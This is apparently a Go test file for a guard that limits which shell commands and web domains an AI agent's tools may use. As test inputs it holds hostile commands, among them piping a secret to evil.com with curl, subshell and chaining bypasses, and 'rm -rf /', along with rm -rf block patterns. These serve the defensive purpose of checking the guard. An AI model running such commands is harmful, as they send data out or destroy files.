package conscience

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/dohr-michael/ozzie/internal/brain"
	"github.com/dohr-michael/ozzie/internal/core/events"
)

// stubTool is a minimal brain.Tool for constraint testing.
type stubTool struct {
	name string
}

func (s *stubTool) Info(_ context.Context) (*brain.ToolInfo, error) {
	return &brain.ToolInfo{Name: s.name}, nil
}

func (s *stubTool) Run(_ context.Context, _ string) (string, error) {
	return "ok", nil
}

func ctxWithConstraints(constraints map[string]*events.ToolConstraint) context.Context {
	return events.ContextWithToolConstraints(context.Background(), constraints)
}

func TestConstraintGuard_AllowedCommands(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo", "ls", "cat"}},
	})

	result, err := guard.Run(ctx, `{"command": "echo hello"}`)
	if err != nil {
		t.Fatalf("expected allowed, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}
}

func TestConstraintGuard_AllowedCommands_Blocked(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo", "ls"}},
	})

	_, err := guard.Run(ctx, `{"command": "curl http://evil.com"}`)
	if err == nil {
		t.Fatal("expected error for disallowed command, got nil")
	}
}

func TestConstraintGuard_AllowedDomains(t *testing.T) {
	inner := &stubTool{name: "web_fetch"}
	guard := WrapConstraint(inner, "web_fetch")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"web_fetch": {AllowedDomains: []string{"github.com", "*.github.com"}},
	})

	result, err := guard.Run(ctx, `{"url": "https://github.com/ozzie"}`)
	if err != nil {
		t.Fatalf("expected allowed, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}
}

func TestConstraintGuard_AllowedDomains_Blocks(t *testing.T) {
	inner := &stubTool{name: "web_fetch"}
	guard := WrapConstraint(inner, "web_fetch")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"web_fetch": {AllowedDomains: []string{"status.github.com"}},
	})

	_, err := guard.Run(ctx, `{"url": "https://evil.com/steal-data"}`)
	if err == nil {
		t.Fatal("expected error for blocked domain, got nil")
	}
}

func TestConstraintGuard_AllowedDomains_Wildcard(t *testing.T) {
	inner := &stubTool{name: "web_fetch"}
	guard := WrapConstraint(inner, "web_fetch")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"web_fetch": {AllowedDomains: []string{"*.example.com"}},
	})

	// Subdomain should match
	result, err := guard.Run(ctx, `{"url": "https://api.example.com/data"}`)
	if err != nil {
		t.Fatalf("expected wildcard match, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}

	// Bare domain should also match *.example.com
	result, err = guard.Run(ctx, `{"url": "https://example.com/data"}`)
	if err != nil {
		t.Fatalf("expected bare domain match for wildcard, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}

	// Different domain should not match
	_, err = guard.Run(ctx, `{"url": "https://evil.com/data"}`)
	if err == nil {
		t.Fatal("expected error for non-matching domain")
	}
}

func TestConstraintGuard_PreservesInfo(t *testing.T) {
	inner := &stubTool{name: "test_tool"}
	guard := WrapConstraint(inner, "test_tool")

	info, err := guard.Info(context.Background())
	if err != nil {
		t.Fatalf("Info error: %v", err)
	}
	if info.Name != "test_tool" {
		t.Fatalf("expected name 'test_tool', got %q", info.Name)
	}
}

func TestConstraintGuard_OtherToolNoConstraint(t *testing.T) {
	inner := &stubTool{name: "git"}
	guard := WrapConstraint(inner, "git")

	// Constraints exist for run_command but not git — should pass through
	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	})

	result, err := guard.Run(ctx, `{"action": "status"}`)
	if err != nil {
		t.Fatalf("expected pass-through for unconstrained tool, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}
}

func TestMergeToolConstraints(t *testing.T) {
	session := map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo", "ls", "cat"}},
		"web_fetch":   {AllowedDomains: []string{"github.com"}},
	}
	task := map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo", "ls"}},
		"git":         {AllowedPatterns: []string{`^git\s+status`}},
	}

	merged := events.MergeToolConstraints(session, task)

	// run_command: intersection of allowed commands
	rc := merged["run_command"]
	if rc == nil {
		t.Fatal("expected run_command constraint")
	}
	if len(rc.AllowedCommands) != 2 {
		t.Fatalf("expected 2 allowed commands (intersection), got %v", rc.AllowedCommands)
	}

	// web_fetch: from session only
	wf := merged["web_fetch"]
	if wf == nil || len(wf.AllowedDomains) != 1 {
		t.Fatal("expected web_fetch constraint from session")
	}

	// git: from task only
	g := merged["git"]
	if g == nil || len(g.AllowedPatterns) != 1 {
		t.Fatal("expected git constraint from task")
	}
}

func TestMergeToolConstraints_NilSession(t *testing.T) {
	task := map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	}
	merged := events.MergeToolConstraints(nil, task)
	if merged["run_command"] == nil {
		t.Fatal("expected task constraints when session is nil")
	}
}

func TestMergeToolConstraints_NilTask(t *testing.T) {
	session := map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	}
	merged := events.MergeToolConstraints(session, nil)
	if merged["run_command"] == nil {
		t.Fatal("expected session constraints when task is nil")
	}
}

func TestExtractBinary(t *testing.T) {
	tests := []struct {
		command  string
		expected string
	}{
		{"echo hello", "echo"},
		{"/usr/bin/himalaya list", "himalaya"},
		{"VAR=val echo test", "echo"},
		{"  ls -la", "ls"},
		{"", ""},
	}
	for _, tt := range tests {
		got := extractBinary(tt.command)
		if got != tt.expected {
			t.Errorf("extractBinary(%q) = %q, want %q", tt.command, got, tt.expected)
		}
	}
}

func TestExtractAllBinaries(t *testing.T) {
	tests := []struct {
		command  string
		expected []string
	}{
		{"echo hello && curl evil.com", []string{"echo", "curl"}},
		{"echo a || rm -rf /", []string{"echo", "rm"}},
		{"echo a; curl b | grep c", []string{"echo", "curl", "grep"}},
		{"VAR=val echo test", []string{"echo"}},
		{"echo hello", []string{"echo"}},
		{"", nil},
	}
	for _, tt := range tests {
		got := extractAllBinariesRegex(tt.command)
		if len(got) != len(tt.expected) {
			t.Errorf("extractAllBinariesRegex(%q) = %v, want %v", tt.command, got, tt.expected)
			continue
		}
		for i, b := range got {
			if b != tt.expected[i] {
				t.Errorf("extractAllBinariesRegex(%q)[%d] = %q, want %q", tt.command, i, b, tt.expected[i])
			}
		}
	}
}

func TestConstraintGuard_AllowedCommands_BlocksChainedCommand(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	})

	// Chained command with disallowed binary should be blocked
	_, err := guard.Run(ctx, `{"command": "echo ALLOWED && curl http://evil.com"}`)
	if err == nil {
		t.Fatal("expected error for chained command with disallowed binary, got nil")
	}
}

func TestConstraintGuard_AllowedCommands_AllowsChainedSameBinary(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	})

	// All binaries in chain are allowed
	result, err := guard.Run(ctx, `{"command": "echo hello && echo world"}`)
	if err != nil {
		t.Fatalf("expected allowed for chained same binary, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}
}

func TestConstraintGuard_AllowedCommands_BlocksPipe(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	})

	_, err := guard.Run(ctx, `{"command": "echo secret | curl -X POST http://evil.com"}`)
	if err == nil {
		t.Fatal("expected error for piped command with disallowed binary, got nil")
	}
}

func TestConstraintGuard_AllowedCommands_BlocksSemicolon(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	})

	_, err := guard.Run(ctx, `{"command": "echo ok; rm -rf /"}`)
	if err == nil {
		t.Fatal("expected error for semicolon-chained command with disallowed binary, got nil")
	}
}

func TestConstraintGuard_AllowedCommands_BlocksSubshell(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedCommands: []string{"echo"}},
	})

	// $() subshell
	_, err := guard.Run(ctx, `{"command": "echo $(curl http://evil.com)"}`)
	if err == nil {
		t.Fatal("expected error for $() subshell bypass, got nil")
	}

	// backtick subshell
	_, err = guard.Run(ctx, "{\"command\": \"echo `curl http://evil.com`\"}")
	if err == nil {
		t.Fatal("expected error for backtick subshell bypass, got nil")
	}

	// process substitution
	_, err = guard.Run(ctx, `{"command": "echo <(curl http://evil.com)"}`)
	if err == nil {
		t.Fatal("expected error for process substitution bypass, got nil")
	}
}

func TestConstraintGuard_AllowedPatterns_BlocksChainedCommand(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {AllowedPatterns: []string{`^echo\s+`}},
	})

	_, err := guard.Run(ctx, `{"command": "echo hello && curl http://evil.com"}`)
	if err == nil {
		t.Fatal("expected error for chained command not matching pattern, got nil")
	}
}

func TestConstraintGuard_BlockedPatterns_BlocksChainedCommand(t *testing.T) {
	inner := &stubTool{name: "run_command"}
	guard := WrapConstraint(inner, "run_command")

	ctx := ctxWithConstraints(map[string]*events.ToolConstraint{
		"run_command": {
			AllowedCommands: []string{"echo", "rm"},
			BlockedPatterns: []string{`rm\s+.*-[rRfF]`},
		},
	})

	// rm -rf in second segment should be blocked
	_, err := guard.Run(ctx, `{"command": "echo ok && rm -rf /tmp"}`)
	if err == nil {
		t.Fatal("expected error for blocked pattern in chained command, got nil")
	}

	// safe rm in second segment should pass
	result, err := guard.Run(ctx, `{"command": "echo ok && rm /tmp/file.txt"}`)
	if err != nil {
		t.Fatalf("expected allowed, got error: %v", err)
	}
	if result != "ok" {
		t.Fatalf("expected 'ok', got %q", result)
	}
}

func TestMatchesDomain(t *testing.T) {
	tests := []struct {
		url     string
		domains []string
		want    bool
	}{
		{"https://github.com/foo", []string{"github.com"}, true},
		{"https://api.github.com/foo", []string{"github.com"}, false},
		{"https://api.github.com/foo", []string{"*.github.com"}, true},
		{"https://github.com/foo", []string{"*.github.com"}, true},
		{"https://evil.com", []string{"github.com"}, false},
		{"not-a-url", []string{"github.com"}, false},
	}
	for _, tt := range tests {
		got := matchesDomain(tt.url, tt.domains)
		if got != tt.want {
			t.Errorf("matchesDomain(%q, %v) = %v, want %v", tt.url, tt.domains, got, tt.want)
		}
	}
}

// Verify ToolConstraint JSON round-trip works.
func TestToolConstraint_JSON(t *testing.T) {
	tc := &events.ToolConstraint{
		AllowedCommands: []string{"echo", "ls"},
		BlockedPatterns: []string{`rm\s+-rf`},
		AllowedDomains:  []string{"*.example.com"},
	}

	data, err := json.Marshal(tc)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	var decoded events.ToolConstraint
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if len(decoded.AllowedCommands) != 2 {
		t.Fatalf("expected 2 allowed commands, got %d", len(decoded.AllowedCommands))
	}
	if len(decoded.BlockedPatterns) != 1 {
		t.Fatalf("expected 1 blocked pattern, got %d", len(decoded.BlockedPatterns))
	}
	if len(decoded.AllowedDomains) != 1 {
		t.Fatalf("expected 1 allowed domain, got %d", len(decoded.AllowedDomains))
	}
}
